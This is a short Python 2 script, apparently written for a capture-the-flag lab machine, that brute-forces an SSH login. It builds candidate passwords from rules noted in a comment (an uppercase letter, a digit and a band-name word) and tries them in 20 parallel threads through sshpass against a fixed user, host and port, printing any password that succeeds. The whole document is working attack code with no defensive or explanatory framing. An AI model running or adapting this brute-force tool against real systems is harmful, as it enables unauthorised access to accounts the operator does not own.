import os
import shlex
import subprocess
from string import ascii_uppercase
from multiprocessing.pool import ThreadPool

USERNAME='RickSanchez'
SSHHOST='192.168.238.128'
SSHPORT=22222
FirstWord="Flesh"
SecondWord="Curtains"
TOTAL_PROCESSES = 20

def TestSSH(password):    
    cmd = 'sshpass -p {0} ssh {1}@{2} -p {3} exit'.format(password, USERNAME, SSHHOST, SSHPORT)
    
    process = subprocess.Popen(shlex.split(cmd),
                            shell=False,
                            stderr=subprocess.PIPE,
                            stdout=subprocess.PIPE)

    output, stderr = process.communicate()
    ret_code = process.wait()
    
    if ret_code == 0:
        print 'Password found: %s' % password
        print 'Execute the following with the found password:\nssh {0}@{1} -p {2}'.format(USERNAME, SSHHOST, SSHPORT)

    


''' RULES
username = RickSanchez
1 uppercase character
1 digit
One of the words in my old bands name
'''
passwordArray=[]

for char in ascii_uppercase:
    for num in range (0,10):
        passwordArray.append("".join(char + str(num) + FirstWord))
        passwordArray.append("".join(char + str(num) + SecondWord))
        # added as a further option just in case...
        passwordArray.append("".join(char + str(num) + FirstWord + SecondWord))


print "Password list generated..."
print "Total Number of Passwords to test = %s" % len(passwordArray)


pool = ThreadPool(processes=TOTAL_PROCESSES)
pool.map(TestSSH, passwordArray)
pool.close()
pool.join()
